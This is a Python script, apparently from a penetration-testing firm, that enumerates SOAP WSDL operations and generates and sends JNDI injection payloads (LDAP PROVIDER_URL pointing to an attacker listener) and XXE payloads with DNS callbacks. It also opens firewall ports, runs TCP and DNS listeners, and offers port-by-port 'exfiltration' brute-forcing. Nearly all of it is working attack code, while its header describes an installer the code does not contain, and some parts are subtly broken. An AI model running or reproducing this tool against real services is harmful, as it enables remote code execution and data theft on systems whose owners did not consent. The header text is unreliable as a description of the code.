#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================

import argparse
import os
import socket
import subprocess
import threading
import time
from http import client
from pathlib import Path
from typing import Dict, List

import requests
from zeep import Client, Settings
from zeep.plugins import HistoryPlugin
from zeep.transports import Transport

from concurrent.futures import ThreadPoolExecutor, as_completed

COMMON_PORTS = [1389, 8080, 8443, 80, 443, 53, 123, 587, 3306, 5000, 7001, 9999]

def start_multiple_tcp_listeners(bind_ip: str, ports: list, timeout: int = 30):
    """Start TCP listeners on multiple ports concurrently. Returns dict with results."""
    results = {}
    threads = []

    def listener_worker(port):
        result = {"port": port, "accepted": False, "peer": None, "error": None}
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["accepted"] = True
                    result["peer"] = addr
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    conn.close()
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)
        results[port] = result

    for p in ports:
        t = threading.Thread(target=listener_worker, args=(p,), daemon=True)
        threads.append(t)
        t.start()

    for t in threads:
        t.join(timeout + 2)

    return results

# ---- Config / Suspicious items to look for ----
SUSPICIOUS_OP_KEYWORDS = ("set", "create", "update", "configure", "init", "start", "stop")
SUSPICIOUS_FIELD_KEYWORDS = [
    "password", "passwd", "credential", "secret", "token", "key", "username", "user", "admin",
    "provider_url", "providerurl", "initial_context_factory", "security_credentials",
    "security_principal", "PROVIDER_URL", "SECURITY_CREDENTIALS", "SECURITY_PRINCIPAL",
    "connectionfactory", "connection_factory", "destinationname", "customprocessor", "customreader",
    "customwriter", "msgSource"
]

# ---- Utility functions ----
def get_local_ip() -> str:
    """Return the primary local IP address used to reach the internet (best-effort)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # connect to a public DNS IP, doesn't send packets
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def ensure_ufw_port_allowed(port: int) -> bool:
    """Add UFW rule for a port - silent operation"""
    try:
        subprocess.run(
            ["sudo", "ufw", "allow", f"{port}/tcp"],
            capture_output=True,
            text=True,
            check=True
        )
        return True
    except Exception:
        return False

def cleanup_ufw_ports(ports: List[int]):
    """Remove UFW rules for multiple ports - silent cleanup"""
    removed = 0
    failed = 0
    for port in ports:
        try:
            result = subprocess.run(
                ["sudo", "ufw", "delete", "allow", f"{port}/tcp"],
                capture_output=True,
                text=True,
                check=False
            )
            if result.returncode == 0:
                removed += 1
            else:
                failed += 1
        except Exception:
            failed += 1

    if removed > 0 or failed > 0:
        print(f"[*] Cleaned up UFW rules: {removed} removed, {failed} already removed")

def check_ufw_status() -> str:
    """Check if UFW is active - returns simple status"""
    try:
        p = subprocess.run(
            ["sudo", "ufw", "status"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if p.returncode == 0:
            # Just check if active or inactive
            if "Status: active" in p.stdout:
                return "active"
            else:
                return "inactive"
        return "unknown"
    except Exception:
        return "unavailable"

def save_payload(filename: Path, xml: str):
    filename.parent.mkdir(parents=True, exist_ok=True)
    filename.write_text(xml, encoding="utf-8")
    print(f"[+] Wrote payload: {filename}")

# ---- Zeep client loader with simple timeout handling ----
def load_wsdl(wsdl_url: str, timeout=15, verify=True):
    session = requests.Session()
    session.verify = verify
    transport = Transport(session=session, timeout=timeout)
    settings = Settings(strict=False, xml_huge_tree=True)
    history = HistoryPlugin()
    client = Client(wsdl=wsdl_url, transport=transport, settings=settings, plugins=[history])
    return client, history

# ---- Recon & payload generation ----
def brute_force_exfiltration(good_payload: dict, base_xml: str, local_ip: str, timeout: int = 30):
    from random import randint

    print("[*] Starting brute-force exfiltration on ports 1â€“1024...")

    stop_flag = threading.Event()
    max_threads = 10

    def worker(port):
        if stop_flag.is_set():
            return None

        ensure_ufw_port_allowed(port)

        xml = base_xml.replace(
            good_payload['payload'].split('_')[-1].split('.')[0],  # replace port placeholder
            f"port{port}"
        ).replace(
            f":{good_payload['payload'].split('port')[-1].split('.')[0]}/", f":{port}/"
        )

        t, result = start_tcp_listener(local_ip, port, timeout=timeout)
        time.sleep(1)

        send_soap_payload(good_payload['target'], xml)

        t.join(timeout + 2)

        cleanup_ufw_ports([port])

        if result["accepted"]:
            stop_flag.set()
            print(f"\n[!!!] SUCCESS - Callback received on port {port} from {result['peer']}")
            return port
        return None

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = {executor.submit(worker, p): p for p in range(1, 1025)}
        for future in as_completed(futures):
            if stop_flag.is_set():
                break

def recon_wsdl(wsdl_url: str):
    """Parse WSDL and return a dict with services, ports, operations, suspicious fields."""
    client, history = load_wsdl(wsdl_url)
    services = {}
    suspicious_fields = set()
    encoded_style = False
    namespaces = {}  # NEW: Store namespaces

    # gather services/ports/operations and detect encoded style usage in raw WSDL if possible
    try:
        raw = requests.get(wsdl_url, timeout=10, verify=wsdl_url.startswith("https")).text
        if "http://schemas.xmlsoap.org/soap/encoding/" in raw:
            encoded_style = True
    except Exception:
        raw = None

    for sname, serv in client.wsdl.services.items():
        services[sname] = {}
        for pname, port in serv.ports.items():
            ops = list(port.binding._operations.keys())

            # Extract namespace from binding
            try:
                binding = port.binding
                if hasattr(binding, 'port_type') and hasattr(binding.port_type, 'name'):
                    ns = binding.port_type.name.namespace
                    namespaces[sname] = ns
            except:
                pass

            services[sname][pname] = {
                "address": port.binding_options.get("address"),
                "binding": str(port.binding.name),
                "operations": ops
            }

    # attempt to discover suspicious element/field names via client.wsdl.types
    try:
        schema = client.wsdl.types
        # elements: try both .elements and generator/list forms
        elems = []
        if hasattr(schema, "elements"):
            try:
                if hasattr(schema.elements, "items"):
                    elems = [k for k, v in schema.elements.items()]
                else:
                    elems = list(schema.elements)
            except Exception:
                elems = []
        for e in elems:
            name = getattr(e, "localname", str(e)).lower() if hasattr(e, "localname") or isinstance(e, tuple) else str(e).lower()
            for kw in SUSPICIOUS_FIELD_KEYWORDS:
                if kw.lower() in name:
                    suspicious_fields.add(name)
    except Exception:
        # fallback: nothing
        pass

    return {
        "services": services,
        "suspicious_fields": sorted(suspicious_fields),
        "encoded_style": encoded_style,
        "namespaces": namespaces  # NEW: Return namespaces
    }

def build_jndi_probe_xml(service_name: str, operation: str, target_ip: str, target_port: int, namespace=None):
    """Generate JNDI probe XML for TCP callbacks - generic, no client identifiers"""

    if namespace:
        ns_prefix = "ns"
        ns_declaration = f' xmlns:ns="{namespace}"'
        op_tag_open = f"<{ns_prefix}:{operation}>"
        op_tag_close = f"</{ns_prefix}:{operation}>"
    else:
        ns_declaration = ""
        op_tag_open = f"<{operation}>"
        op_tag_close = f"</{operation}>"

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"{ns_declaration}>
  <soapenv:Body>
    {op_tag_open}
      <jmsConfig>
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{target_ip}:{target_port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    {op_tag_close}
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml


def build_jndi_dns_probe_xml(service_name: str, operation: str, dns_domain: str, port: int = 389, namespace=None):
    """Generate JNDI payload that triggers DNS lookup - dynamically uses namespace or generic"""

    if namespace:
        ns_prefix = "ns"
        ns_declaration = f' xmlns:ns="{namespace}"'
        op_tag_open = f"<{ns_prefix}:{operation}>"
        op_tag_close = f"</{ns_prefix}:{operation}>"
    else:
        ns_declaration = ""
        op_tag_open = f"<{operation}>"
        op_tag_close = f"</{operation}>"

    unique_id = operation.lower().replace('_', '-')

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"{ns_declaration}>
  <soapenv:Body>
    {op_tag_open}
      <jmsConfig>
        <INITIAL_CONTEXT_FACTORY>com.sun.jndi.ldap.LdapCtxFactory</INITIAL_CONTEXT_FACTORY>
        <PROVIDER_URL>ldap://{dns_domain}:{port}/Exploit</PROVIDER_URL>
        <SECURITY_PRINCIPAL>probe</SECURITY_PRINCIPAL>
        <SECURITY_CREDENTIALS>probe</SECURITY_CREDENTIALS>
        <valid>true</valid>
      </jmsConfig>
    {op_tag_close}
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml


def build_xxe_dns_probe_xml(operation: str, dns_domain: str, namespace=None):
    """Generate XXE payload that triggers DNS lookup - dynamically uses namespace or generic"""
    import re

    is_ip = re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dns_domain)
    if is_ip:
        return None

    if namespace:
        ns_prefix = "ns"
        ns_declaration = f' xmlns:ns="{namespace}"'
        op_tag = f"{ns_prefix}:{operation}"
    else:
        ns_declaration = ""
        op_tag = operation

    unique_id = operation.lower().replace('_', '-')

    xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-{unique_id}.{dns_domain}/">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"{ns_declaration}>
  <soapenv:Body>
    <{op_tag}>&xxe;</{op_tag}>
  </soapenv:Body>
</soapenv:Envelope>
"""
    return xml

def start_dns_listener(bind_ip: str = '0.0.0.0', timeout: int = 30):
    """Start UDP DNS listener on port 53 to capture DNS queries"""
    result = {"queries": [], "accepted": False, "error": None}

    def dns_worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((bind_ip, 53))
            sock.settimeout(timeout)

            print(f"[+] DNS listener active on {bind_ip}:53 (UDP)")
            result["accepted"] = True

            start_time = time.time()
            while time.time() - start_time < timeout:
                try:
                    data, addr = sock.recvfrom(512)

                    # Parse DNS query to extract domain name
                    try:
                        # Skip DNS header (12 bytes) and parse question section
                        domain_parts = []
                        idx = 12
                        while idx < len(data) and data[idx] != 0:
                            length = data[idx]
                            if length == 0:
                                break
                            domain_parts.append(data[idx+1:idx+1+length].decode('utf-8', errors='ignore'))
                            idx += length + 1

                        domain = '.'.join(domain_parts) if domain_parts else "unknown"
                    except:
                        domain = "parse_error"

                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')

                    print(f"\n{'='*80}")
                    print(f"[!!!] DNS QUERY RECEIVED!")
                    print(f"[!!!] Domain: {domain}")
                    print(f"[!!!] From: {addr[0]}:{addr[1]}")
                    print(f"[!!!] Time: {timestamp}")
                    print(f"{'='*80}\n")

                    result["queries"].append({
                        "domain": domain,
                        "from": addr,
                        "timestamp": timestamp
                    })

                    # Send DNS response (dummy IP 127.0.0.1)
                    response = data[0:2]  # Transaction ID
                    response += b'\x81\x80'  # Flags: response, no error
                    response += data[4:6]  # Questions
                    response += b'\x00\x01'  # Answer RRs
                    response += b'\x00\x00'  # Authority RRs
                    response += b'\x00\x00'  # Additional RRs
                    response += data[12:idx+1]  # Original question
                    response += b'\xc0\x0c'  # Name pointer
                    response += b'\x00\x01'  # Type A
                    response += b'\x00\x01'  # Class IN
                    response += b'\x00\x00\x00\x3c'  # TTL (60 seconds)
                    response += b'\x00\x04'  # Data length
                    response += b'\x7f\x00\x00\x01'  # IP: 127.0.0.1

                    sock.sendto(response, addr)

                except socket.timeout:
                    continue

            sock.close()

        except PermissionError:
            result["error"] = "permission_denied"
            result["accepted"] = False
        except Exception as e:
            result["error"] = str(e)
            result["accepted"] = False

    thread = threading.Thread(target=dns_worker, daemon=True)
    thread.start()
    return thread, result

def ensure_ufw_dns_allowed() -> bool:
    """Add UFW rule for UDP/53 - silent operation"""
    try:
        subprocess.run(
            ["sudo", "ufw", "allow", "53/udp"],
            capture_output=True,
            text=True,
            check=True
        )
        return True
    except Exception:
        return False

def cleanup_ufw_dns() -> bool:
    """Remove UFW rule for UDP/53 - silent"""
    try:
        subprocess.run(
            ["sudo", "ufw", "delete", "allow", "53/udp"],
            capture_output=True,
            text=True,
            check=True
        )
        return True
    except Exception:
        return False

# ---- Active network functions ----
def start_tcp_listener(bind_ip: str, bind_port: int, timeout: int = 30):

    result = {"conn": None, "peer": None, "accepted": False}

    def _listener():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind((bind_ip, bind_port))
                s.listen(1)
                s.settimeout(timeout)
                try:
                    conn, addr = s.accept()
                    result["conn"] = conn
                    result["peer"] = addr
                    result["accepted"] = True
                    # try to read small amount then close
                    try:
                        conn.settimeout(2)
                        _ = conn.recv(1024)
                    except Exception:
                        pass
                    try:
                        conn.close()
                    except Exception:
                        pass
                except socket.timeout:
                    pass
        except Exception as e:
            result["error"] = str(e)

    t = threading.Thread(target=_listener, daemon=True)
    t.start()
    return t, result

def send_soap_payload(url: str, xml: str, timeout=15, verify=True):

    headers = {
        "Content-Type": "text/xml",
        "SOAPAction": '""'
    }
    try:
        r = requests.post(url, data=xml.encode("utf-8"), headers=headers, timeout=timeout, verify=verify)
        status = r.status_code
        body = r.text[:2000]

        if "Fault" in body or status >= 400:
            verdict = "Rejected by Service (SOAP Fault or HTTP error)"
        elif 200 <= status < 300:
            verdict = "Possibly Accepted / Executed"
        else:
            verdict = "Unknown or Unhandled HTTP Status"

        return {
            "status_code": status,
            "text": body,
            "headers": dict(r.headers),
            "verdict": verdict
        }

    except Exception as e:
        return {
            "error": str(e),
            "verdict": "Dropped or No Response"
        }

def main():
    ap = argparse.ArgumentParser(description="Automate WSDL recon and JNDI/XXE probe with DNS or TCP callbacks")
    ap.add_argument("--wsdl", required=True, help="WSDL URL")
    ap.add_argument("--outdir", default="payloads", help="Directory to write payload XML files")
    ap.add_argument("--exploit", action="store_true", help="Enable active exploit/probe sending (automatically uses TCP listeners)")
    ap.add_argument("--recon", action="store_true", help="Recon-only mode: assess potential risk without sending traffic")

    # Callback methods
    ap.add_argument("--dns-callback", action="store_true", help="Use DNS callbacks - automatically starts DNS listener on UDP/53 (auto-detects public IP)")
    ap.add_argument("--listener", action="store_true", help="Use TCP listeners (enabled by default with --exploit)")
    ap.add_argument("--listen-ip", default=None, help="IP to bind listeners to (defaults to auto-detected)")

    ap.add_argument("--timeout", type=int, default=45, help="Listener timeout seconds (default: 45)")
    ap.add_argument("--no-verify-tls", action="store_true", help="Do not verify TLS when sending SOAP requests")
    args = ap.parse_args()

    wsdl = args.wsdl
    outdir = Path(args.outdir)
    verify_tls = not args.no_verify_tls

    print(f"[+] Reconnaissance: parsing WSDL {wsdl}")
    recon = recon_wsdl(wsdl)
    services = recon["services"]
    namespaces = recon.get("namespaces", {})

    print(f"[+] Found services: {list(services.keys())}")
    for sname, ports in services.items():
        for pname, pinfo in ports.items():
            print(f"  - Service: {sname} / Port: {pname}")
            print(f"    Address: {pinfo.get('address')}")
            print(f"    Operations: {pinfo.get('operations')}")

    if recon["suspicious_fields"]:
        print(f"[!] Suspicious fields discovered: {recon['suspicious_fields']}")
    if recon["encoded_style"]:
        print("[!] WSDL indicates encoded/RPC style usage (higher risk)")

# Determine callback method
    dns_callback = None
    use_tcp = False
    dns_listener_thread = None
    dns_listener_result = None

    if args.dns_callback:
        # DNS mode - auto-detect public IP
        dns_callback = get_local_ip()
        print(f"[*] DNS callback mode enabled")
        print(f"[*] Auto-detected IP: {dns_callback}")
        print(f"[*] Will start DNS listener on UDP/53")
    elif args.exploit or args.listener:
        # TCP mode (default when --exploit is used)
        use_tcp = True
        local_ip = args.listen_ip if args.listen_ip else get_local_ip()
        print(f"[+] TCP callback mode enabled")
        print(f"[+] Using TCP callbacks to: {local_ip}")
    else:
        print("[!] Must specify --exploit (uses TCP) or --dns-callback (uses DNS)")
        return

    if args.recon:
        if recon["encoded_style"] or recon["suspicious_fields"]:
            print("\n[+] Recon-only mode active. Target WSDL appears POTENTIALLY VULNERABLE due to:")
            if recon["encoded_style"]:
                print("  - Use of SOAP encoded style (RPC/encoded)")
            if recon["suspicious_fields"]:
                print("  - Field names matching sensitive or JNDI-related patterns")
        else:
            print("\n[+] Recon-only mode active. No immediate signs of unsafe operations")
        return

    outdir.mkdir(parents=True, exist_ok=True)
    generated = []

    # Check if callback is IP or domain
    import re
    is_ip = re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', dns_callback) if dns_callback else False

    for sname, ports in services.items():
        safe_sname = sname.replace(" ", "_").replace("/", "_")
        service_namespace = namespaces.get(sname, None)  # Get namespace for this service (or None for generic)

        for pname, pinfo in ports.items():
            for op in pinfo.get("operations", []):
                lower = op.lower()
                is_interesting = any(k in lower for k in SUSPICIOUS_OP_KEYWORDS) or "jms" in lower or "flatfile" in lower or "timer" in lower
                if not is_interesting:
                    continue

                if dns_callback:
                    # JNDI with DNS (use generic namespace for stealth)
                    xml_jndi = build_jndi_dns_probe_xml(safe_sname, op, dns_callback, namespace=None)
                    fname_jndi = outdir / f"{safe_sname}_{op}_jndi_dns.xml"
                    save_payload(fname_jndi, xml_jndi)
                    generated.append(("JNDI-DNS", op, fname_jndi, pinfo.get("address")))

                    # XXE with DNS (only if domain, not IP)
                    if not is_ip:
                        xml_xxe = build_xxe_dns_probe_xml(op, dns_callback, namespace=None)
                        if xml_xxe:
                            fname_xxe = outdir / f"{safe_sname}_{op}_xxe_dns.xml"
                            save_payload(fname_xxe, xml_xxe)
                            generated.append(("XXE-DNS", op, fname_xxe, pinfo.get("address")))

                else:
                    # Generate TCP callback payloads (original behavior)
                    for port in COMMON_PORTS:
                        xml = build_jndi_probe_xml(safe_sname, op, local_ip, port, namespace=None)
                        fname = outdir / f"{safe_sname}_{op}_port{port}.xml"
                        save_payload(fname, xml)
                        generated.append(("JNDI-TCP", op, fname, pinfo.get("address")))

    if not generated:
        print("[+] No interesting operations found. Exiting.")
        return

    print(f"[+] Generated {len(generated)} probe payload(s) in {outdir}")

    if not args.exploit:
        print("[+] Dry-run complete. Use --exploit to run active probes.")
        return

    # Start listeners
    listener_results = None
    open_tcp_ports = []
    dns_ufw_added = False

    try:
        if dns_callback:
            # DNS mode - start DNS listener
            print("\n[*] Starting DNS listener...")

            # Add UFW rule
            dns_ufw_added = ensure_ufw_dns_allowed()

            # Start DNS listener
            bind_ip = args.listen_ip if args.listen_ip else '0.0.0.0'
            dns_listener_thread, dns_listener_result = start_dns_listener(bind_ip, timeout=args.timeout)
            time.sleep(2)

            # Verify listener started
            if dns_listener_result.get("accepted"):
                print(f"[+] DNS listener confirmed running on {bind_ip}:53")
            else:
                error = dns_listener_result.get("error", "unknown")
                if error == "permission_denied":
                    print("\n[!] PERMISSION DENIED - DNS listener requires root privileges")
                    print("[!] Rerun with: sudo python3 wsdl_auto_exploit.py ...")
                    return
                else:
                    print(f"\n[!] Failed to start DNS listener: {error}")
                    return

            # DEBUG: Show sample payload
            print(f"\n[DEBUG] Sample DNS payload content:")
            first_dns_payload = [p for p in generated if 'DNS' in p[0]][0]
            sample_xml = first_dns_payload[2].read_text(encoding="utf-8")
            for line in sample_xml.split('\n'):
                if 'PROVIDER_URL' in line or 'ENTITY xxe' in line:
                    print(f"[DEBUG] Callback URL: {line.strip()}")

        elif use_tcp:
            # TCP mode - start TCP listeners
            ufw_status = check_ufw_status()
            print(f"[*] Firewall status: {ufw_status}")
            print(f"[*] Configuring firewall rules for {len(COMMON_PORTS)} ports...")

            for p in COMMON_PORTS:
                if ensure_ufw_port_allowed(p):
                    open_tcp_ports.append(p)

            print(f"[+] Firewall configured for ports: {COMMON_PORTS}")
            print(f"[+] Starting TCP listeners...")
            listener_results = start_multiple_tcp_listeners(local_ip, COMMON_PORTS, timeout=args.timeout)
            time.sleep(1)

        final_report = []

        # Send all payloads
        print(f"\n[*] Sending {len(generated)} payloads...")
        successes = []
        failures = 0

        for payload_type, op, fname, address in generated:
            xml = fname.read_text(encoding="utf-8")
            target_url = address if address else wsdl
            r = send_soap_payload(target_url, xml, verify=verify_tls)
            verdict = r.get("verdict", "No verdict")
            status = r.get("status_code", r.get("error"))

            # Only display successes (status 200)
            if status == 200:
                print(f"\n{'='*80}")
                print(f"[!!!] SUCCESS - Payload Accepted!")
                print(f"{'='*80}")
                print(f"Verdict:   {verdict}")
                print(f"Operation: {op}")
                print(f"Type:      {payload_type}")
                print(f"Target:    {target_url}")
                print(f"Payload:   {fname.name}")
                print(f"Status:    {status}")
                print(f"{'='*80}\n")

                successes.append({
                    "operation": op,
                    "type": payload_type,
                    "target": target_url,
                    "payload": str(fname),
                    "verdict": verdict,
                    "status": status
                })
            else:
                failures += 1

            # Add everything to final report
            final_report.append({
                "operation": op,
                "type": payload_type,
                "target": target_url,
                "payload": str(fname),
                "verdict": verdict,
                "status": status
            })

        # Summary
        print(f"\n[*] Payload Execution Summary:")
        print(f"    Successful (200): {len(successes)}")
        print(f"    Failed/Rejected:  {failures}")

        # Check for callbacks
        if dns_callback:
            # DNS mode - wait for DNS listener
            print(f"\n[*] Waiting for DNS queries (timeout: {args.timeout}s)...")
            dns_listener_thread.join(timeout=args.timeout + 5)

            print("\n" + "="*80)
            print("DNS LISTENER RESULTS")
            print("="*80)

            queries = dns_listener_result.get("queries", [])
            packets_received = dns_listener_result.get("packets_received", 0)

            print(f"[*] Total UDP packets received: {packets_received}")

            if queries:
                print(f"\n[!!!] SUCCESS - Received {len(queries)} DNS queries!")
                print(f"[!!!] Target is VULNERABLE to DNS-based attacks!")

                for query in queries:
                    print(f"\n[+] Query: {query['domain']}")
                    print(f"    From: {query['from'][0]}")
                    print(f"    Time: {query['timestamp']}")

                    final_report.append({
                        "callback_type": "dns",
                        "callback_received": True,
                        "domain": query['domain'],
                        "from_ip": query['from'][0],
                        "timestamp": query['timestamp']
                    })
            else:
                print("\n[*] No DNS queries received")
                if packets_received == 0:
                    print("[!] No UDP packets received at all - check firewall/routing")
                print("[*] Target may not be vulnerable or DNS is being filtered")

        elif use_tcp:
            # TCP mode - check listener results
            print("\n=== TCP Listener Summary ===")
            callbacks_received = 0
            for port, result in listener_results.items():
                if result["accepted"]:
                    print(f"[!!!] Port {port}: CONNECTION from {result['peer']}")
                    callbacks_received += 1
                    final_report.append({
                        "listener_port": port,
                        "callback_received": True,
                        "peer": result['peer']
                    })
                else:
                    print(f"[-] Port {port}: No connection")

            if callbacks_received > 0:
                print(f"\n[!!!] SUCCESS - {callbacks_received} TCP callback(s) received!")

            else:
                print(f"\n[!] No TCP callbacks received.")

                # Identify best candidate payload (first status 200)
                if successes:
                    good = successes[0]
                    payload_path = Path(good["payload"])
                    if payload_path.exists():
                        base_payload = payload_path.read_text(encoding="utf-8")

                        choice = input("[?] Would you like to brute-force exfiltration on ports 1-1024? (y/N): ").strip().lower()
                        if choice == 'y':
                            brute_force_exfiltration(good, base_payload, local_ip, timeout=args.timeout)
                        else:
                            print("[*] Exiting without brute-force exfiltration.")

        print("\nDone.")

    finally:
        # Cleanup
        print("\n[*] Cleaning up firewall rules...")
        if dns_ufw_added:
            cleanup_ufw_dns()

        if open_tcp_ports:
            cleanup_ufw_ports(open_tcp_ports)

        print("[*] Cleanup complete\n")

if __name__ == "__main__":
    main()
